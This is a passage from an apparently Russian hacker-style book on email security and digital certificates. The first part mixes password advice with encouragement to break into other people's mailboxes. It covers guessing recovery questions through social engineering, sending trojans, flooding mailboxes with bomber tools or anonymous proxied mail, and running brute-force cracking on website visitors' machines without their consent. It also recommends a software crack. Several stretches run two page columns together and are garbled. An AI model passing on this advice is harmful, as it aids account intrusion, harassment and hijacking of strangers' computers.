файловая система с шифрованием (Encrypted File System, EFS),
позволяющая хранить файлы и папки в зашифрованном виде.
Благодаря этому корпоративные и индивидуальные пользователи
решат проблему возможной утечки секретной информации при
краже переносного компьютера или жесткого диска из сервера.
Зашифрованная информация даже в случае физического доступа
к жесткому диску останется недоступной.
E mail «безопасная»
119
Шифрование и
безопасность
Тонкости работы с E mail
Самый распространенный способ общения людей в Инете
— это конечно E mail (мыло), электронная почта (и чат с конфа
ми). Можно переписываться с кем угодно по всему миру, полу
чать новости, обменивать и скачивать проги. Все это, конечно,
происходит в Инете.
Я бы не стал говорить, что мыло действительно нужно каж
дому, это даже не РУЛЕЗЗЗ (правило жизни) и не ПОИНТ (базо
вая точка), МЫЛО — эта сама жизнь! Жизнь в Интернете осно
вана на взаимном общении и E mail в этом — основа! Конечно,
есть и другие способы общения (Аська, BBS), но об этом позже...
Ящик (почтовую службу) нужно выбрать понадёжней и по
ближе к себе, зачем — понятно.
Работать с почтой можно по разному. Работать в броузере
на страничках почтовых служб наиболее глупо и небезопасно (хо
тя в случае внезапной потери всей инфо на винте это пригодит
ся, т.к. письма хранятся на сервере почтовой службы). Однако, ча
ще пользуются мейлерами — спецовыми прогами, которые
скачивают почту с серваков и выдают тебе её на блюдечке. Ти
пичный пример — OutLook Express, который встроен в Маздай и
потому многие его используют.
Трудно перечислить все баги и неудобства при работе с Оут
луком, т.к. их также много, как и в самом Маздае (хотя бы то, что
можно написать макротроян уже настораживает!).
120
E mail «безопасная»
Шифрование и безопасность
Шифрование и безопасность
Чтобы не портить нервы и сразу изучать продвинутый софт
скачайте себе The Bat! вместе с кряком и не парьтесь!
Немного о работе этой проги.
После интуитивно простой установки она запросит у вас
разрешение на Мейлер по умолчанию. Соглашайтесь не раздумы
вая! Дальше ещё проще! Мастер настройки поможет организовать
доступ к всем вашим почтовым сервакам. Короче, поюзайте эту
прогу и всё получится!
Ставя себе Ящик, многие пользователи уверены, что им во
обще не суждено встретить хакеров. Как они ошибаются. Вот на
пример ты — 5 минут назад был юзером, а концу этого урока —
не дай БОГ кто нибудь наедет на тебя, чей мыльник ты знаешь.
Тут вступает в силу взаимное уважение.
Вернёмся к безопасности мыла! Одно из главных правил не
только хакера, но и просто пользователя Инета — нельзя прене
брегать сложностью паролей. Вот основные правила:
Представим, что ваш логин: keks.
1. Ни в коем случае пароль не должен совпадать с логином:
keks.
2. Лучше вообще не использовать маску логина для пароля:
kekskeks, keks99, skek123 или даже kkes3213.
3. Не используйте цифровые пароли: 123456, 33325 или во
обще 111!
4. Не используйте короткие пароли (их можно взломать
Brute Forse, т.е. атакой прямого полного перебора): iq, me или 1.
Ты спросишь: «Зачем ты тогда написал те 5 длинных пра
вил о неправильных паролях?». Всё просто, когда ты будешь пы
таться взломать ЧУЖОЙ пароль, тебе они очень пригодятся. А
вдруг кто нибудь прохалтурил? И всё — его ящик под твоим кон
тролем!
Как ещё можно узнать пароли к мыльнику? Существует мас
са способов. Например, в некоторых почтовых службах предлага
ют услуги по подсказке пароля к Ящику, если ты сообщишь им
дату создания этого Ящика или ответишь на некоторый вопрос
(который ты сам задаешь при создании ящика). Ответы на эти во
просы можно незаметно выудить из самого человека (метод Со
циального Перегруза) или попытаться подобрать самому. Напри
мер самый распространенный вопрос — «Как меня зовут?» Ну, и
вариации на эту тему!
Подобная штука есть на http://www.mail.ru/, делайте выво
ды. Конечно, самый надёжный способ узнать пароль — это офф
или он лайн шпионство (засылка троянчиков). Здесь, как гово
рится, результат не заставит себя долго ждать.
Можно как либо ещё обезопасить информацию в Ящике от
несанкционированного (т.е. непредвиденного тобой) прочтения?
Можно! Дружно шифруем самые важные письма прогой PGP
(Pretty Good Privacy). Работая в маздае, конечно лучше пользо
ваться PGP версией для этой операционки. Установка этой про
ги интуитивно проста, в случае проблем воспользуйтесь англо
русским переводчиком.
Как же запомнить все эти правила? Всё просто: запомни как Поговорим немного о истории создания и принципах ис
                                              НАДО делать! Делай пароли длиннее 8 ми символов, которые со пользования этой проги, в смысле метода шифрации. Криптогра
                                                                                             держат цифры и символы разного регистра вперемежку, типа: фия и крякинг (в смысле взлом паролей) очень связанные вещи
                                                                                                                                             d0Ye9Kd24B#d. (как брат и сестра). Тут и нечего оспаривать, основная проблема
                                                                                                                                                                                                            и головная боль Администраторов серваков, как бы надежно со
                                                                                                                                                                                                                                                             хранить для себя и сделать абсолютно недоступно для других не
                                                                                                                                                                                                                                                                                                                кую информацию. А это, как видите, прямая задача криптогра
                                                                                                                                                                                                                                                                                                                                                              фии. Конкретно про PGP: лично я ей не пользуюсь, потому что
                                                                                                                                                                                                                                                                                                                                                                                                        это слишком нудно шифровать каждое сообщение, когда по E
E mail «безопасная» 122
5. Не используйте словарные слова (тоже можно взломать
перебором по словарю, которых сейчас очень много в Инете)
halyava, fignya или anton.
121
E mail «безопасная»
Шифрование и безопасность
Шифрование и безопасность
mail почти в режиме он лайн обсуждаешь последние новости ха
кинга. Но сам процесс шифрования я советую знать (для общего
развития!). Я также предлагаю ознакомиться с подробнейшим хел
пом по эксплуатации PGP for Windows 9x, правда на английском
языке!
Теперь поговорим о конкретном: Атака на мыло — это, в
основном, флуд ящика. Флуд — это когда у вас в ящике напри
мер, около 10 тысяч 100 Кб ных писем лежит. Вот и попробуй ра
зобраться с ними. Вообще то зафлудить мыло проще пареной ре
пы, вот, к примеру 3 способа:
1. Воспользоваться мейл генератором. Спецовая прога, ко
торая создаёт огромное количество писем и посылает их по адре
су с вашего компа. Вот типичные проги: HackTek и ещё лучше
Avalanch.
2. Воспользоваться почтовой службой общественного поль
зования, типа http://www.mail.ru/ или http://www.inbox.ru/ и под
анонимным логином отослать штук 20 писем размером по 500 Кб.
Только не забудь прокси включить.
Вам пришло письмо с темой «угадай кто Я?». Да, раз плю
нуть, и ты вытаскиваешь из пришедшего письма много информа
ции о человеке его приславшем. Суть в том, что к каждому пись
му прикрепляется небольшая шапка, которая содержит много
интересной информации: IРшник, название и регистрационный
номер проги — мейлера, которым пользуется приславший пись
мо, почтовая служба, уникальный номер письма, путь прохожде
ния письма до вас, время отправления и прибытия, номер компа
в локальной сети и многое другое. Однако, всё это скрыто от чи
тателя, т.е. тебя! Давай посмотрим эту интересную инфу. Если ты
всё еще пользуешься Outlook, то открываем исследуемое письмо
и жмем Файл, затем Свойства и выбираем закладку Подробности.
Теперь всё на виду. В The Bat! делаем так: Открываем письмо,
жмём Просмотр и выбираем Служебная информация. Сверху пись
ма прибавляется полезная шапка.
3. Подписать атакуемое мыло на какую нибудь эху (типа О том, что можно вытянуть из шапки, я покажу тебе на при
                                          компьютерные клубы, где обсуждаются разные темы среди боль мере (символом «?» помечены мои комментарии).
                                                                                            шого круга людей. В принципе тут проблем нет, но я не советую Return Path: lameruga@mail.ru
                                                                                                                                            этим злоупотреблять, т.к. это ламерские шутки. Используйте их, ?Установленный адрес возврата, но он мало что говорит,
                                                                                                                                                                                              если есть повод. Вот типично: вы договорились об обмене данны т.к. его с лёгкостью можно подделать (мы сами ставим его
                                                                                                                                                                                                                                                ми, а ваш партнёр обманул вас. Вот тут это и пригодится. Вы ска в настройках)
                                                                                                                                                                                                                                                                                                жете: всякое бывает, что делать, если зафлудили мой ящик? Не Received: from relay1.aha.ru ([195.2.83.105] verified) by
                                                                                                                                                                                                                                                                                                                                               огорчайтесь! Воспользуйтесь прогой HackTek. Она быстренько aha.ru (CommuniGate Pro SMTP 3.1b4)
                                                                                                                                                                                                                                                                                                                                                                                           расчистит весь флуд у вас в ящике. Единственная маленькая не with ESMTP id 4637825 for system@local.net; Sun, 11 Jul
                                                                                                                                                                                                                                                                                                                                                                                                                                             приятность — это то, что она вместе с флудом удалит нужные вам 1999 23:16:46 +0400
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                письма. Можно поставить защиту от флуда на самом почтовом ?Дата получения послания моим почтовым серваком
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                серваке. Есть там опция, которая не позволяет принимать письма Received: from elephant.mail.ru (elephant.mail.ru
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    на ваш ящик размером более 100 Кб (это вы сами устанавливае [194.226.198.85]) by relay1.aha.ru
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 те). Это частично решает проблему. Это как ядерное оружие — все (8.9.3/8.9.3/aha r/0.04B) with ESMTP id XAA00604 for
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    об этом знают, но никто им не пользуется, зато в мире порядок (system@local.net); Sun, 11 Jul 1999 23:16:46+0400 (MSD)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    и дружба. Теперь ты тоже ядерная страна! ?Дальше пошли почтовые серваки с их IPшниками и датами
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       получения\пересылки
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        Received: from camel int ([10.0.1.1] helo=camel.mail.ru)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       by elephant.mail.ru
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      with esmtp (Exim2.12 #1) id 113P5h 000NVu 00; Sun, 11
E mail «безопасная» 124
123
E mail «безопасная»
Шифрование и безопасность
Шифрование и безопасность
Jul 1999 23:16:45 +0400
Received: (from mail@localhost) by camel.mail.ru
(8.9.2/8.9.1) id XAA64053; Sun,
11 Jul 199923:16:45 +0400 (MSD)Date: Sun, 11 Jul 1999
23:16:45 +0400 (MSD)
?Вот и дата прибытия письма на мой почтовый сервак.
Message Id: 199907111916.XAA64053@camel.mail.ru
?Уникальный номер письма. Если тебя зафлудили или присла
ли что нибудь нехорошее, то ты можешь поговорить с адми
ном почтового сервака про это письмо. Можно узнать много
интересного.
Received: from [212.46.8.60] by win.mail.ru with HTTP;
Sun, 11 Jul 1999 19:16:45 +0000 (GMT)
?Ага вот тебе и IP приславшего с датой отправки
From: =?KOI8 R?Q?"Виктор=20Т"?= (lameruga@mail.ru)
?Кодировка отправления и мыло отправителя
To: system@local.net
?это ты.
Cc: lameruga@mail.ruSubject: =?KOI8 R?Q?Re:=20передложе
ние=20проекта?=
Mime Version: 1.0X Mailer: The Bat! (v1.33) S/N 9EB473C9
?Посылал The Bat! версия и регистрационный номер как на
ладони.
X Originating IP: [212.46.8.60]?IP'шник товарища,отправивше
го мне письмо.
Content Type: text/plain; charset=koi8 r
?Сообщение выслано прямым простым текстом в кодировке
KOI8 R
Content Transfer Encoding: 8bit?
После всего — это уже неважно!
Способы послать анонимный е мейл мы уже рассмотрели
выше на примере, как зафлудить ящик. В этом случае нужно про
сто послать всего одно сообщение, а не 10000! То, что вас не уз
нают — это 100%. Только не нарывайтесь на международные
службы типа FBI или ФАПСИ, они могут узнать ваш IP у про
E mail «безопасная»
125
кси сервера (вот им он точно расскажет!). Но, я думаю, вы люди
умные и сами сможете определить — на кого стоит нарываться, а
с кем лучше дружить (правило хакера: не ссорься со всеми сра
зу!).
Я намекну, что можно крякнуть пароли на мыло и прямым
Brute Force. Но используя ресурсы только твоего компа — это мо
жет занять месяц! Тут нужно действовать по другому. Возможно
организовать Brute Force атаку с вашей паги (page), используя
Java апплет. И каждый посетитель вашей странички (с согласия
или без) будет принимать участие в кряке! В этом случае можно
сломать пароль и за 2 4 дня! Но подробнее об этом позже.
Brute Force
Теперь можно подвести итоги. В целом, как ты заметил, су
ществует масса способов хакнуть мыльник. Лучше всего пользо
ваться почтовыми серверам в вашей локальной сетке и периоди
чески скачивать оттуда почту. В целом любой ваш ящик находится
в относительной безопасности. Ящиков очень много (ну просто
очень много) и лично я не знаю таких маньяков в Инете, кото
рые бы целый день только и делали, что ломали чьи то ящики! Да
и статистика в целом показывает, что это происходит крайне ред
ко! Ну что ж, как говориться в пословице: «Будь собой, не дай ла
му просохнуть». Знай, пользуйся, но не увлекайся, ведь все люди
братья.
Кто ты такой?
Организация защищенных соединений через Internet бес
смысленна без идентификации другой стороны. В этой ситуации
доказательством, что вы тот, за кого себя выдаете, послужит ци
фровой сертификат.
Проверка в фоновом режиме
Когда мы выписываем чек, чтобы расплатиться за товар, да
леко не каждый продавец относится к этому банковскому доку
126
E mail «безопасная»
Шифрование и безопасность
Шифрование и безопасность
менту с безоговорочным доверием. Зачастую вас просят предъя
вить какое либо удостоверение личности, например паспорт (а
вдруг вы не тот, кем представились, и не имеете законных прав
использовать эти чеки).
При заверении документов и другой письменной информа
ции печать официального лица, которое может поручиться за до
кумент, является, как правило, убедительным доказательством. И
банковские чеки, и письменный документ не всегда достаточно
убедительны сами по себе, но, когда их предъявляют вместе с га
рантией третьего лица, они заслуживают гораздо большего дове
рия.
С появлением электронной коммерции важность вопроса
определения подлинности возросла многократно. В магазине про
давец сравнивает фотографию в паспорте с лицом стоящего перед
ним покупателя. Когда же товары покупаются по Internet или ког
да частные электронные сообщения передаются туда и обратно,
узнать, что другая сторона именно та, за кого она себя выдает, не
так то просто. Обычно, все что вы видите, это адрес электронной
почты, а им может воспользоваться кто угодно. Даже сообщения,
зашифрованные с помощью некой алгоритмической формулы, не
всегда служат гарантией подлинности.
Скептики утверждают, что розничные продажи по Internet
невелики и будут оставаться на низком уровне, пока Internet и ее
наиболее широко используемый компонент World Wide Web не
станут абсолютно надежными. Этот скептицизм относится не
только к электронной коммерции, но и к передаче документов по
Internet и корпоративным сетям Intranet. При передаче важных
документов лично или через традиционную почтовую систему
хватит печати адвоката, однако когда эти документы преобразу
ются в биты и передаются через киберпространство, печати ста
новится недостаточно.
Один из способов создания заслуживающих доверия средств
ведения бизнеса по Internet — это разрешить пользователям при
обретать цифровые сертификаты для подтверждения личности.
E mail «безопасная»
127
Цифровые сертификаты — довольно новая концепция. Однако,
после того как шифрование с открытыми ключами приобрело по
пулярность, потребность в цифровых сертификатах стала вырисо
вываться все четче.
Общественная собственность
Со времени появления электронной связи люди были оза
бочены конфиденциальностью своих сообщений. В середине
70 х два человека — Винфилд Диффи и Мартин Хеллман — опи
сали принципы шифрования с открытыми ключами.
При шифровании с открытыми ключами генерируется пара
ключей — один открытый и один личный. С помощью этой пары
ключей и математического алгоритма шифруются и дешифруют
ся все текстовые сообщения. Вместо передачи другому лицу сек
ретных ключей с риском, что их кто нибудь узнает, пользователи
делают достоянием гласности только половину своей схемы ши
фрования. Благодаря доступности открытых ключей отправитель
может зашифровать подготовленное сообщение с использовани
ем открытого ключа получателя. Получатель затем применяет
свой личный ключ к сообщению для его дешифровки.
При желании, отправитель может зашифровать сообщение
с помощью своего закрытого ключа, тогда для дешифровки сооб
щения получатель применит открытый ключ отправителя.
В 1978 году три человека (Рон Ривест, Ади Шамир и Лен
Адлман) разработали систему шифрования с открытыми ключами
RSA, полностью отвечающей всем принципам Диффи Хеллмана.
Основное отличие RSA состоит в поддержке цифровых подписей.
Цифровые подписи представляют собой уникальную последова
тельность битов, применяемую к сообщению до того, как оно ши
фруется. Если сообщение имеет цифровую подпись, то получатель
может быть уверен, что оно не было изменено или подделано по
пути.
Шифрование с открытыми ключами обладает рядом пре
имуществ над такими системами шифрования с закрытыми клю
128
E mail «безопасная»
Шифрование и безопасность
Шифрование и безопасность
чами, как Kerberos, в котором для шифровки и дешифровки со
общений используется один ключ. В случае системы шифрования
с открытыми ключами централизованное хранение секретов от
сутствует, в случае же системы с секретными ключами, если ха
кер разобьет хотя бы один горшочек с медом, то он испортит и
все остальные.
Хотя при шифровании только некоторые лица получают до
ступ и могут дешифровать сообщения и хотя цифровые подписи
гарантируют, что сообщения не были изменены во время переда
чи, при ведении бизнеса через Internet одна проблема все же ос
тается: как проверить личность своего партнера?
Если кто либо помещает свои открытые ключи для исполь
зования другими, то ему ничего не стоит заявить, что он — коро
лева английская. Но как узнать наверняка, что открытый ключ в
Internet принадлежит действительно тому лицу, за кого он себя
выдает, а не 14 летнему подростку, вознамерившемуся выведать
данные о вашей кредитной карточке?
Группа знакомых между собой людей может распространить
в своей среде открытые ключи, передавая их лично на дискетах,
что гарантирует идентичность. Но для лиц, незнающих друг дру
га, способа подтверждения того, что сообщение пришло действи
тельно от того лица, за которое отправитель себя выдает, не су
ществует.
Принадлежность открытого ключа является важнейшим мо
ментом. Собираясь зашифровать сообщение, должна быть
уверенность в том, что открытый ключ принадлежит и другой сто
роне. Равно как и ваш партнер, получая сообщение с подписью и
открытым ключом, не должен усомниться в том, что открытый
ключ принадлежит именно вам.
того, кто отправил вам сообщение, сертификат подтвердит под
линность личности.
Цифровые стандарты отвечают стандарту X.509 CCITT (те
перь ITU) — международно признанному формату для определе
ния сертификатов открытых ключей. Получить цифровой серти
фикат не так уж и сложно. После создания пары ключей
пользователь может отправить открытый ключ по электронной
почте или принести его на гибкой дискете лично уполномоченно
му по выпуску сертификатов (Certificate Authority, CA) вместе с
теми или иными удостоверениями личности. Эти доказательства
зависят от типа получаемого сертификата. Уполномоченный про
веряет доказательства подлинности, помещает свою цифровую
подпись в файл, содержащий открытый ключ и посылает серти
фикат обратно, подтверждая факт принадлежности данного кон
кретного ключа конкретному лицу. После выпуска сертификат
может быть присоединен к любой электронной транзакции.
Строительные блоки
Сертификат X.509 состоит из нескольких компонентов, в
том числе открытого ключа пользователя, а также цифровой под
писи выдавшего сертификат уполномоченного.
В связи с тем, что крупные компании уже имеют идентифи
кационную информацию о своих сотрудниках (например коды со
циального обеспечения), многие начали сами выступать в роли
уполномоченного по выпуску сертификатов. Когда компания со
здает отдел по выдаче сертификатов для своих сотрудников, она
уже знает, что они собой представляют. Сертификат в данном слу
чае становится дополнением к другим уже имеющим место про
цедурам.
Цифровые сертификаты предназначены для удостоверения Если крупная компания желает удовлетворять потребностям
                                                принадлежности открытого ключа. Если вы никогда не встречали своих сотрудников в сертификатах полностью, ей необходимо
                                                                                                                                                                                                                  иметь три ключевых составляющих, без которых стать уполномо
                                                                                                                                                                                                                                                                    ченным по выпуску сертификатов не получится.
E mail «безопасная» 130
Получение сертификата
129
E mail «безопасная»
Шифрование и безопасность
Шифрование и безопасность
Во первых, для надежного управления сертификатами в те
чение всего их жизненного цикла компании нужна технология в
виде программного обеспечения.
Аналогично водительским правам и паспортам сертифика
ты не являются бессрочными: система должна ограничивать срок
годности сертификата (по истечении срока сертификат либо об
новляется, либо аннулируется).
Во вторых, компания, желающая стать своим собственным
уполномоченным, нуждается в инфраструктуре для поддержки
подобных операций. Такая инфраструктура состоит из персонала,
обслуживания клиентов, круглосуточной поддержки и надежной
защиты системы выпуска сертификатов.
В третьих, компании придется выработать подробные про
цедуры. Эти процедуры должны объяснять, что собственно ком
пания гарантирует своим сертификатом.
Несмотря на то что задача представляется устрашающей
(для всех, за исключением крупнейших компаний, имеющих сред
ства и персонал для того, чтобы быть собственным уполномочен
ным), некоторые ведущие компании в области информационной
защиты предлагают продукты, с помощью которых организации
любых масштабов могут создать для своих сотрудников и деловых
партнеров хорошо защищенную сеть в киберпространстве.
Сделайте это сами!
Серверы из линии SuiteSpot компании Netscape Communi
cations позиционируются как гибкие компоненты, выбор комби
наций которых определяется потребностями компании в Intranet
и Internet. Один из этих компонентов — Netscape Sertificate Serv
er. Продукт поддерживает такие открытые протоколы, как X.509,
Secure Socket Layer (SSL), HTML и Lightweight Directory Access
Protocol (LDAP), и обеспечивает создание и управление сертифи
катами открытых ключей с применением алгоритма цифровой
подписи RSA.
E mail «безопасная»
131
Кроме того, продукты для компаний, желающих стать соб
ственными уполномоченными, предлагаются компанией Cylink.
Система SecureAccess System представляет собой метод управле
ния удаленным доступом для защиты удаленных узлов от вторже
ния с помощью сертификатов X.509.
Другой игрок в области управления сертификатами — это
Northern Telecom, чье программное обеспечение для защиты ин
формации Entrust поддерживает и алгоритм цифровой подписи
RSA, а также используемый правительством Соединенных Шта
тов алгоритм Digital Signature Standard. Entrust позволяет админи
страторам сетей задавать срок годности каждому сертификату в
отдельности, что поможет компаниям с временными и постоян
ными сотрудниками отслеживать законных пользователей.
Разработчики программного обеспечения, желающие со
здать программу управления сертификатами сами, могут сделать
это при помощи BCERT, нового инструмента от RSA Data Secu
rity, поддерживающего стандарт X.509 и его расширения. BCERT
можно использовать для генерации сертификатов, а также состав
ления и распространения списков аннулированных сертификатов.
Помимо достоинств в предоставлении компанией услуг по
выдаче сертификатов есть и свои недостатки. Во первых, мелкие
компании могут не иметь ни персонала, ни ресурсов для такой за
теи.
Во вторых, цифровой сертификат, выданной одной компа
нией, признается сотрудниками и партнерами только этой компа
нии. Например, если Miller Freeman выдает сертификаты для ты
сяч сотрудников по всему миру, то они будут наверняка знать, что
лицо, имеющее сертификат Miller Freeman, было проверено кор
поративным офисом; поэтому каких либо сомнений при обраще
нии по электронной почте к тому, кто называет себя нашим кол
легой, не возникнет.
Но если сотрудник Miller Freeman хочет вести бизнес через
Internet или использовать иной электронный способ общения с
лицом из другой компании, то компания предполагаемого парт
132
E mail «безопасная»
Шифрование и безопасность
Шифрование и безопасность
нера может не признавать выданные Miller Freeman сертификаты
и не разрешить установление соединения. В конце концов, как
она узнает, какие шаги Miller Freeman предпринимает, чтобы га
рантировать идентичность своих сотрудников?
Две компании, часто работающие друг с другом и имеющие
собственную систему выпуска сертификатов, могут решить при
нимать сертификаты друг друга в качестве доказательства иден
тичности. Однако даже при относительно небольшом числе парт
неров обмен сертификатами становится нереальным. Эта
проблема по силам лишь независимым уполномоченным по вы
пуску общедоступных сертификатов.
Помощь со стороны
Компании, действующие как свои собственные уполномо
ченные и нуждающиеся в дополнительной степени уверенности
при деловых контактах с другими компаниями, а также организа
ции, не способные организовать службу сертификации самостоя
тельно, могут обратиться к нескольким независимым организаци
ям для получения сертификатов, действительных как внутри, так
и вне обратившейся организации.
Компанией, взявшей на себя эту ответственность, стала
Verisign. Она была образована с целью организации службы циф
ровой идентификации. Начиная с 1986 года RSA получала запро
сы о предоставлении цифровых сертификатов, а с ростом Internet
эти запросы хлынули настоящим потоком. Стало очевидно, что
организация выпуска сертификатов представляет собой крупный
бизнес. И если RSA работает как лицензирующая компания, то
компания Verisign предоставляет услуги в этой сфере.
Компания вышла на рынок цифровых сертификатов с пред
ложением Digital ID для серверов, поддерживающих SSL. Когда и
сервер, и браузер поддерживают SSL, вся передаваемая между бра
узером и сервером информация (например номера кредитных кар
точек) может быть скрыта от любопытных глаз посредством от
крытия защищенного сеанса.
Заказчики, использующие SSL совместимые браузеры, та
кие как Netscape Navigator или Internet Explorer, могут осуществ
лять защищенные транзакции с SSL совместимым сервером, при
чем весь процесс согласования между сервером и браузером скрыт
от пользователя. При вызове защищенной страницы пользователь
не видит происходящий между браузером и сервером обмен. Бра
узер вызывает сервер, а тот посылает свой общедоступный серти
фикат, и если он был выдан организацией, признаваемой браузе
ром, то транзакция осуществляется. Если вас не затруднит
просмотреть опцию защиты своего браузера, то вы увидите спи
сок признаваемых браузером уполномоченных по выпуску серти
фикатов.
После начала цифровой идентификации серверов Verisign
объявила, что она собирается внедрить ту же самую методику
идентификации на клиентском уровне для ряда приложений, в
том числе для браузеров Web и защищенной электронной почты
Internet с многоцелевыми расширениями (S/MIME). Она дейст
вительно предложила такую методику для Netscape Navigator и
Internet Explorer, так что данные браузеры смогут не только авто
матически идентифицировать серверы, но и предоставлять дока
зательство идентичности клиента.
Среди предоставляемых Verisign услуг выпуск и управление Скорее всего, общедоступные сертификаты не станут посто
                                          общедоступными сертификатами (называемыми также цифровы янными уникальными электронными документами: как водитель
                                                                                            ми идентификаторами, или Digital ID), выпуск частных сертифи ские права и паспорта, они должны будут периодически обнов
                                                                                                                                     катов для компаний, не желающих заниматься этим самостоятель ляться. Кроме того, не исключено, что кому то понадобится
                                                                                                                                                                                         но, и предложение продуктов по управлению сертификатами. несколько сертификатов. Например, один сертификат может при
                                                                                                                                                                                                                                                                                                                                                    соединяться к личной корреспонденции и электронным операци
                                                                                                                                                                                                                                                                                                                                                                                                       ям через Internet, в то время как сертификат с информацией от
E mail «безопасная» 134
133
E mail «безопасная»
Шифрование и безопасность
Шифрование и безопасность
работодателя будет использоваться для деловой корреспонденции
и транзакций.
Ни рыба, ни мясо
Бизнес по выдаче сертификатов открывает широкое поле
для деятельности. Несмотря на отсутствие специальных требова
ний к уполномоченному, организация, берущая на себя эту роль,
должна иметь некоторые обязательства, чтобы ее рассматривали
как заслуживающий доверия источник сертификатов.
Если кто либо вмешается в процесс выпуска сертификатов,
уполномоченный должен иметь средства для его выявления. Кро
ме того, уполномоченный должен быть доступен физически.
За прошедшие 200 лет Почтовая служба создала более или
менее надежную систему доставки почты, и кажется вполне ло
гичным, что это государственное учреждение займется поднятием
электронных коммуникаций до того же уровня надежности.
Ввиду того, что Почтовая служба имеет отделения практи
чески в каждом городке и городе Соединенных Штатов, возмож
ность просто отнести открытый ключ на дискете в ближайшее от
деление для получения цифрового сертификата может оказаться
весьма привлекательной для многих. Кроме того, закон против
мошенничества с почтовыми сообщениями позволяет Почтовой
службе преследовать тех, кто мошенничает с почтой.
Другой компанией, собирающейся заняться сертификацией,
является подразделение сетевых систем GTE, комплект услуг ко
торой по удостоверению подлинности сертификатов будет вклю
чать аппаратные и программные продукты. CyberSign — это служ
ба GTE по выпуску сертификатов для предприятий и частных лиц.
Аналогично системе Verisign, CyberSign выпускает цифровые сер
тификаты с различной степенью защищенности. И, как и в слу
чае сертификатов Verisign, GTE поддерживается последними вер
сиями браузеров.
быть наложены поверх сертификатов, выданных внутренней сис
темой сертификации.
Такое изобилие уполномоченных, может, и вызовет некото
рое беспокойство со стороны пользующихся их услугами частных
лиц и компаний. Уполномоченные заявляют о себе как о доверен
ных независимых организациях, но как мы можем знать, что все
они заслуживают доверия? Этот вопрос сегодня не столь важен,
но после того, как сертификаты получат распространение и, впол
не вероятно, станут обязательными, вопрос доверия уполномо
ченному будет весьма актуален.
Кто наблюдает за наблюдениями?
На данный момент Verisign выдала около 400 000 сертифи
катов для серверов и браузеров и около 1000 для защищенной поч
ты, но на каком основании компания стала называть себя дове
ренным уполномоченным? Никто ей на это права не давал,
однако Verisign предприняла несколько шагов, гарантирующих,
что злоупотреблений данной уполномоченному властью не будет.
Verisign завоевала доверие клиентов благодаря знанию техноло
гии, защищенности нашей инфраструктуры и целостности нас как
организации. То же самое относится к Почтовой службе, предо
ставляющей требуемые услуги в течение десятилетий и считаю
щейся экспертом в деле доставке сообщений.
Verisign составила «Правила организации сертификации»
(Certification Practice Statement) с рекомендациями об организа
ции процесса выпуска и обслуживания цифровых идентификато
ров и правилами поведения уполномоченных.
Помимо документа Verisign такая нейтральная сторона, как
American Bar Association, разработала ряд правил о цифровых под
писях, причем они использовались и при разработке законода
тельства о цифровых подписях для электронной коммерции во
многих штатах.
Сертификат любой из этих трех организаций может призна Следующим шагом ABA станет, похоже, разработка реко
                                               ваться действительным сам по себе; сертификаты также могут мендаций для уполномоченных по выдаче сертификатов.
E mail «безопасная» 136
135
E mail «безопасная»
Шифрование и безопасность
Шифрование и безопасность
Несмотря на новизну темы цифровых сертификатов для
многих конечных пользователей некоторые уполномоченные уже
распространяют свою деятельность на другие области: они сотруд
ничают с компаниями эмитентами кредитных карточек в деле ор
ганизации защищенных транзакций с кредитными карточками в
интерактивном режиме.
Verisign вместе с Visa International занимается обеспечением
крупнейших банков средствами выпуска цифровых кредитных
карточек для клиентов. American Express выбрала GTE для выпу
ска цифровых сертификатов, известных как American Express
NetID. Благодаря этим сертификатам клиенты могут приобретать
товары и услуги по Internet с помощью своих кредитных карто
чек. Оба сценария предусматривают использование протокола
Secure Electronic Transaction.
В качестве одной из услуг Verisign предлагает несколько ти
пов сертификатов под названием Digital ID для конечных пользо
вателей. Они отличаются по типу приложений, для которых они
предназначены, и по уровню надежности.
Класс 1. Использование при нерегулярных путешествиях по
Web, отправке и получении шифрованной электронной почты. На
этом уровне Verisign требуется уникальное имя или адрес элек
тронной почты для выдачи Digital ID. Плата за идентификаторы
данного класса составит 6 долларов в год, пока же эта услуга бес
платна.
Класс 2. Использование при обмене электронной почтой
внутри компании и в подписных интерактивных службах. На этом
уровне идентичность частного лица должна быть подтверждена
независимо. Плата за идентификаторы данного класса составляет
12 долларов в год.
Класс 3. Использование при обмене электронной почтой
внутри компании, электронных банковских операциях, покупке
дорогостоящих предметов и в членских интерактивных службах.
На этом уровне частное лицо должно явиться лично или предо
ставить подтверждающие документы. Плата за идентификаторы
E mail «безопасная»
137
данного класса составляет 24 доллара в год для частных лиц и 290
долларов для серверов Web (75 долларов за последующие ежегод
ные обновления).
Класс 4. Использование при крупных финансовых операци
ях. На этом уровне Verisign наводит справки о частном лице или
компании, запрашивающем ID. Плата за такую услугу на момент
выхода статьи была неизвестна.
В течение последних лет мы только и слышали, что никто
еще не сделал денег на Internet, но с объединением компаний тех
нического и банковского мира прибыль, получаемая интерактив
но, не так уж и не реальна, если не сказать больше.
В Internet никто не знает, кто вы — собака, 14 летний хакер
или законный пользователь, но с доказательствами идентичности
личности электронные коммерция и связь могут стать такими же
надежными, как оплата по чеку в магазине.
Алгоритм шифрования с открытыми
ключами
Недостаток традиционных криптографических систем, в ко
торых ключи шифрования и дешифрования одинаковы, состоит в
том, что ключи должны быть предоставлены всем пользователям
системы. Это повышает вероятность кражи ключа как при рас
пространении, так и при хранении. В 1976 году два ученых из
Стэнфордского университета, Диффи и Хеллман, предложили
принципиально иную криптографическую систему, в которой
ключ шифрования и ключ дешифрования отличаются друг от дру
га, причем последний нельзя определить по первому. Алгоритм
шифрования (E) и алгоритм дешифрования (D) должны отвечать
трем основным требованиям:
■ ■ D практически невозможно определить по E;
■ 
138
D(E(T))=T (T — шифруемый текст);
Е нельзя взломать.
E mail «безопасная»
